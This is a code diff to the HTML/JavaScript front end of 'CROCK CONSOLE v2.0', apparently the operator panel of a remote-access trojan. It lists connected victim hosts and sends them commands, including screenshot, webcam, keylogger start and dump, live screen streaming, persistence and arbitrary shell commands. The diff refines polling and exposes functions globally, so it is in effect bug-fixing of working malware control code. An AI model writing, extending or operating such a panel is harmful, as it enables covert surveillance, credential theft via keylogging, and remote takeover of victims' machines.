@@ -260,7 +260,7 @@ body.reduce-motion .ambient *,body.reduce-motion .terminal::before{animation:non
 (()=>{'use strict';
  const $=id=>document.getElementById(id);const icons=name=>`<svg class="ico"><use href="#i-${name}"/></svg>`;
  const DEMO=[{id:101,u:'root',h:'atlas-gateway',ip:'10.20.0.12',a:1,os:'Ubuntu 24.04'},{id:102,u:'deploy',h:'nova-edge-02',ip:'10.20.0.18',a:0,os:'Debian 13'},{id:103,u:'operator',h:'lab-workstation',ip:'192.168.56.20',a:0,os:'Kali Linux'},{id:104,u:'ubuntu',h:'storage-node',ip:'10.20.0.25',a:0,os:'Ubuntu 22.04'}];
- let demo=location.protocol==='file:',nodes=[],selected=null,busy=false,autoRefresh=true,motion=true,commandsRun=0,history=[],historyPos=0,pollPending=false;
+ let demo=location.protocol==='file:',nodes=[],selected=null,busy=false,autoRefresh=true,motion=true,commandsRun=0,history=[],historyPos=0,pollPending=false,pollGen=0;
  const events=[],samples=Array(36).fill(0),logs=[];
  function toast(message){const d=document.createElement('div');d.className='toast';d.innerHTML=icons('info');const t=document.createElement('span');t.textContent=message;d.appendChild(t);$('toastContainer').append(d);setTimeout(()=>{d.style.opacity='0';d.style.transform='translateY(10px)';setTimeout(()=>d.remove(),250)},3500)}
  function log(type,text){logs.push({type,text,at:new Date()});const div=document.createElement('div');div.className='term-row '+type;if(type==='command'){const prompt=document.createElement('span');prompt.textContent='❯';div.appendChild(prompt)}div.appendChild(document.createTextNode(text));$('terminalOutput').append(div);$('terminalOutput').scrollTop=$('terminalOutput').scrollHeight;if(logs.length>300){logs.shift();const rows=$('terminalOutput').querySelectorAll('.term-row');if(rows.length>300)rows[0].remove()}}
@@ -274,8 +274,58 @@ body.reduce-motion .ambient *,body.reduce-motion .terminal::before{animation:non
  function select(id){if(String(selected)===String(id)){$('commandInput').focus();return}selected=id;updateSelection();const n=selectedNode();log('system',`[SESSION] Выбран узел ${n?n.h:'#'+id}`);$('commandInput').focus();toast(`Активная сессия: ${n?n.h:id}`)}
  function chart(){const box=$('activityChart');box.replaceChildren();const max=Math.max(1,...samples);samples.forEach((val,i)=>{const bar=document.createElement('div');bar.className='bar';bar.style.setProperty('--height',`${6+Math.round((val/max)*90)}%`);bar.title=`${val} узлов · опрос ${i+1}`;box.append(bar)})}
  function addSample(n){samples.shift();samples.push(n);chart()}
- async function poll(){if(pollPending||demo||!autoRefresh)return;pollPending=true;try{const controller=new AbortController();const timeout=setTimeout(()=>controller.abort(),3500);let response;try{response=await fetch('/clients',{cache:'no-store',signal:controller.signal})}finally{clearTimeout(timeout)}if(!response.ok)throw Error(`HTTP ${response.status}`);const data=await response.json();if(!Array.isArray(data))throw Error('Некорректный ответ');nodes=data.filter(n=>n&&n.id!=null);$('apiStatus').textContent='Соединение с API установлено';$('lastSync').textContent=new Date().toLocaleTimeString('ru-RU',{hour12:false});$('modeBadge').textContent='LOCAL CONSOLE';addSample(nodes.length);if(selected!=null&&!selectedNode()){log('system','[SESSION] Выбранный узел отключён');selected=null}renderNodes();updateSelection()}catch(e){$('apiStatus').textContent='API недоступен';$('lastSync').textContent='Нет связи';$('modeBadge').textContent='OFFLINE CONSOLE';$('onlineNote').textContent='Проверьте запуск Python-сервера';}finally{pollPending=false}}
- function setDemo(value){demo=value;selected=null;nodes=demo?DEMO.slice():[];$('demoButtonText').textContent=demo?'Выключить демо':'Демо-режим';$('modeBadge').textContent=demo?'DEMO PREVIEW':'LOCAL CONSOLE';$('lastSync').textContent=demo?'DEMO MODE':'—';$('apiStatus').textContent=demo?'Без подключения к API':'Ожидание ответа API';$('searchInput').value='';$('terminalOutput').innerHTML='<div class="term-welcome"><div class="big">CROCK CONSOLE  /  v2.0</div><div class="small">Выберите узел для работы.</div></div>';logs.length=0;log('system',demo?'[DEMO] Демонстрация: реальные команды не отправляются':'[SYSTEM] Работа с реальными подключениями');samples.fill(0);for(let i=0;i<36;i++)samples[i]=demo?[2,3,4,3,4,2,4,4,3,4,4,4][i%12]:0;chart();renderNodes();updateSelection();if(!demo)poll();toast(demo?'Включён безопасный демо-режим':'Возврат к реальным подключениям')}
+ async function poll(force=false){
+  if(pollPending||demo)return;
+  if(!autoRefresh && !force)return;
+  const gen=++pollGen;
+  pollPending=true;
+  try{
+    const controller=new AbortController();
+    const timeout=setTimeout(()=>controller.abort(),3500);
+    let response;
+    try{response=await fetch('/clients',{cache:'no-store',signal:controller.signal})}
+    finally{clearTimeout(timeout)}
+    if(gen!==pollGen||demo)return;
+    if(!response.ok)throw Error(`HTTP ${response.status}`);
+    const data=await response.json();
+    if(!Array.isArray(data))throw Error('Некорректный ответ');
+    nodes=data.filter(n=>n&&n.id!=null);
+    $('apiStatus').textContent='Соединение с API установлено';
+    $('lastSync').textContent=new Date().toLocaleTimeString('ru-RU',{hour12:false});
+    $('modeBadge').textContent='LOCAL CONSOLE';
+    addSample(nodes.length);
+    if(selected!=null&&!selectedNode()){log('system','[SESSION] Выбранный узел отключён');selected=null}
+    renderNodes();updateSelection();
+  }catch(e){
+    if(gen!==pollGen||demo)return;
+    nodes=[];
+    selected=null;
+    $('apiStatus').textContent='API недоступен';
+    $('lastSync').textContent='Нет связи';
+    $('modeBadge').textContent='OFFLINE CONSOLE';
+    $('onlineNote').textContent='Проверьте запуск Python-сервера';
+    renderNodes();updateSelection();
+  }finally{pollPending=false}
+ }
+ function setDemo(value){
+  demo=value;
+  pollGen++;
+  selected=null;
+  nodes=demo?DEMO.slice():[];
+  $('demoButtonText').textContent=demo?'Выключить демо':'Демо-режим';
+  $('modeBadge').textContent=demo?'DEMO PREVIEW':'LOCAL CONSOLE';
+  $('lastSync').textContent=demo?'DEMO MODE':'—';
+  $('apiStatus').textContent=demo?'Без подключения к API':'Ожидание ответа API';
+  $('searchInput').value='';
+  $('terminalOutput').innerHTML='<div class="term-welcome"><div class="big">CROCK CONSOLE  /  v2.0</div><div class="small">Выберите узел для работы.</div></div>';
+  logs.length=0;
+  log('system',demo?'[DEMO] Демонстрация: реальные команды не отправляются':'[SYSTEM] Работа с реальными подключениями');
+  samples.fill(0);
+  for(let i=0;i<36;i++)samples[i]=demo?[2,3,4,3,4,2,4,4,3,4,4,4][i%12]:0;
+  chart();renderNodes();updateSelection();
+  if(!demo)poll(true);
+  toast(demo?'Включён безопасный демо-режим':'Возврат к реальным подключениям');
+ }
  const fake={hostname:'atlas-gateway',whoami:'root',uptime:'16:42:03 up 3 days, 4:16, 2 users, load average: 0.08, 0.13, 0.11','info':'OS: Ubuntu Linux\nArchitecture: x86_64\nStatus: Demo instance\nConnection: SIMULATED'};
  async function sendCommand(raw,asInfo=false){const cmd=raw.trim();if(!cmd||busy)return;const n=selectedNode();if(!n){toast('Сначала выберите подключённый узел');return}busy=true;$('sendButton').disabled=true;$('sendButton').classList.add('spin');$('sendButton').querySelector('span').textContent='Работа...';log('command',cmd);history.push(cmd);historyPos=history.length;commandsRun++;$('commandCount').textContent=commandsRun;$('commandInput').value='';try{let response;if(demo){await new Promise(r=>setTimeout(r,500));response={out:fake[cmd]??`[DEMO] Команда «${cmd}» не выполнялась. Это предварительный просмотр интерфейса.`}}else{const controller=new AbortController();const t=setTimeout(()=>controller.abort(),20000);try{const res=await fetch('/cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:n.id,cmd:(['screenshot','webcam','proclist','keylog_start','keylog_stop','keylog_dump','keylog_clear','stream_start','stream_stop','persist','ping','info'].includes(cmd)||asInfo)?cmd:'sh:'+cmd}),signal:controller.signal});if(!res.ok)throw Error(`Ошибка HTTP ${res.status}`);response=await res.json()}finally{clearTimeout(t)}}let out=response&&typeof response.out==='string'?response.out:'';
 log('output',(out.startsWith('IMG:')||out.startsWith('FRAME:'))?'[image]':(out||'(пустой ответ)'));
@@ -283,7 +333,7 @@ if(out.startsWith('IMG:')){
   const box=document.getElementById('imgbox');
   if(box) box.innerHTML='<img style="max-width:100%;border:1px solid #333;border-radius:8px" src="data:image/bmp;base64,'+out.slice(4)+'">';
 }}catch(e){log('error',`[ERROR] ${e.message}`);toast(`Ошибка: ${e.message}`)}finally{busy=false;$('sendButton').disabled=false;$('sendButton').classList.remove('spin');$('sendButton').querySelector('span').textContent='Выполнить';$('commandInput').focus()}}
- function refresh(){if(demo){toast('Это демо-режим: данные демонстрационные');return}poll()}
+ function refresh(){if(demo){toast('Это демо-режим: данные демонстрационные');return}poll(true)}
  $('commandForm').addEventListener('submit',e=>{e.preventDefault();sendCommand($('commandInput').value)});
  $('infoChip').addEventListener('click',()=>sendCommand('info',true));document.querySelectorAll('[data-command]').forEach(b=>b.addEventListener('click',()=>{$('commandInput').value=b.dataset.command;$('commandInput').focus()}));
  $('commandInput').addEventListener('keydown',e=>{if(e.key==='ArrowUp'){if(history.length){e.preventDefault();historyPos=Math.max(0,historyPos-1);e.target.value=history[historyPos]}}else if(e.key==='ArrowDown'){if(history.length){e.preventDefault();historyPos=Math.min(history.length,historyPos+1);e.target.value=history[historyPos]||''}}});
@@ -298,7 +348,9 @@ if(out.startsWith('IMG:')){
  $('searchInput').addEventListener('input',renderNodes);
  document.querySelectorAll('.spotlight').forEach(card=>card.addEventListener('pointermove',e=>{const r=card.getBoundingClientRect();card.style.setProperty('--mx',`${e.clientX-r.left}px`);card.style.setProperty('--my',`${e.clientY-r.top}px`)}));
  document.querySelectorAll('.btn').forEach(b=>b.addEventListener('pointerdown',e=>{const r=b.getBoundingClientRect();b.style.setProperty('--x',(e.clientX-r.left)+'px');b.style.setProperty('--y',(e.clientY-r.top)+'px')}));
- chart();renderNodes();updateSelection();if(demo)setDemo(true);else poll();setInterval(()=>{if(autoRefresh)poll()},3000);
+ window.sendCommand=sendCommand;
+ window.selectedNode=selectedNode;
+ chart();renderNodes();updateSelection();if(demo)setDemo(true);else poll(true);setInterval(()=>{if(autoRefresh)poll()},3000);
 })();
 </script>
 <div id="imgbox" style="margin:16px auto;max-width:1100px;text-align:center"></div>
@@ -309,10 +361,10 @@ document.addEventListener('DOMContentLoaded',()=>{
   const off=document.getElementById('streamOff');
   let timer=null;
   if(on) on.addEventListener('click',()=>{
-    if(typeof sendCommand==='function') sendCommand('stream_start');
+    if(window.sendCommand) window.sendCommand('stream_start');
     if(timer) clearInterval(timer);
     timer=setInterval(()=>{
-      const n=typeof selectedNode==='function'?selectedNode():null;
+      const n=window.selectedNode?window.selectedNode():null;
       if(!n) return;
       fetch('/frame?id='+n.id).then(r=>r.json()).then(d=>{
         if(d.frame){
@@ -324,7 +376,7 @@ document.addEventListener('DOMContentLoaded',()=>{
   });
   if(off) off.addEventListener('click',()=>{
     if(timer){clearInterval(timer);timer=null;}
-    if(typeof sendCommand==='function') sendCommand('stream_stop');
+    if(window.sendCommand) window.sendCommand('stream_stop');
   });
 });
 </script>
